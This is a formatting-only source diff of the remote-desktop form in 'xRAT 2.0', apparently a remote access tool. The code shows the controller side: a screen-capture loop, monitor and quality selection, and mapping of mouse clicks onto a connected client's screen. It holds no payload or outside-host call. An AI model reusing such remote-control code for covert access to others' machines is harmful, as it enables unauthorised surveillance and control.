@@ -23,14 +23,15 @@ namespace xServer.Forms
 
         private void FrmRemoteDesktop_Load(object sender, EventArgs e)
         {
-            this.Text = string.Format("xRAT 2.0 - Remote Desktop [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
+            this.Text = string.Format("xRAT 2.0 - Remote Desktop [{0}:{1}]", _connectClient.EndPoint.Address.ToString(),
+                _connectClient.EndPoint.Port.ToString());
 
-            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);
+            panelTop.Left = (this.Width/2) - (panelTop.Width/2);
 
-            btnHide.Left = (panelTop.Width / 2) - (btnHide.Width / 2);
+            btnHide.Left = (panelTop.Width/2) - (btnHide.Width/2);
 
             btnShow.Location = new System.Drawing.Point(377, 0);
-            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);
+            btnShow.Left = (this.Width/2) - (btnShow.Width/2);
 
             if (_connectClient.Value != null)
                 new Core.Packets.ServerPackets.Monitors().Execute(_connectClient);
@@ -44,7 +45,7 @@ namespace xServer.Forms
             {
                 try
                 {
-                    this.Invoke((MethodInvoker)delegate
+                    this.Invoke((MethodInvoker) delegate
                     {
                         btnStart.Enabled = false;
                         btnStop.Enabled = true;
@@ -57,7 +58,7 @@ namespace xServer.Forms
                         {
                             int quality = 1;
                             int selectedMonitorIndex = 0;
-                            this.Invoke((MethodInvoker)delegate
+                            this.Invoke((MethodInvoker) delegate
                             {
                                 quality = barQuality.Value;
                                 selectedMonitorIndex = cbMonitors.SelectedIndex;
@@ -70,12 +71,13 @@ namespace xServer.Forms
                     Thread.Sleep(100);
                 }
                 catch
-                { }
+                {
+                }
             }
 
             try
             {
-                this.Invoke((MethodInvoker)delegate
+                this.Invoke((MethodInvoker) delegate
                 {
                     btnStart.Enabled = true;
                     btnStop.Enabled = false;
@@ -83,7 +85,8 @@ namespace xServer.Forms
                 });
             }
             catch
-            { }
+            {
+            }
 
             _keepRunning = false;
         }
@@ -97,8 +100,8 @@ namespace xServer.Forms
 
         private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
         {
-            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);
-            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);
+            panelTop.Left = (this.Width/2) - (panelTop.Width/2);
+            btnShow.Left = (this.Width/2) - (btnShow.Width/2);
         }
 
         private void btnStart_Click(object sender, EventArgs e)
@@ -150,8 +153,8 @@ namespace xServer.Forms
                 int local_x = e.X;
                 int local_y = e.Y;
 
-                int remote_x = local_x * picDesktop.Image.Width / picDesktop.Width;
-                int remote_y = local_y * picDesktop.Image.Height / picDesktop.Height;
+                int remote_x = local_x*picDesktop.Image.Width/picDesktop.Width;
+                int remote_y = local_y*picDesktop.Image.Height/picDesktop.Height;
 
                 bool left = true;
                 if (e.Button == MouseButtons.Right)
@@ -169,8 +172,8 @@ namespace xServer.Forms
                 int local_x = e.X;
                 int local_y = e.Y;
 
-                int remote_x = local_x * picDesktop.Image.Width / picDesktop.Width;
-                int remote_y = local_y * picDesktop.Image.Height / picDesktop.Height;
+                int remote_x = local_x*picDesktop.Image.Width/picDesktop.Width;
+                int remote_y = local_y*picDesktop.Image.Height/picDesktop.Height;
 
                 bool left = true;
                 if (e.Button == MouseButtons.Right)
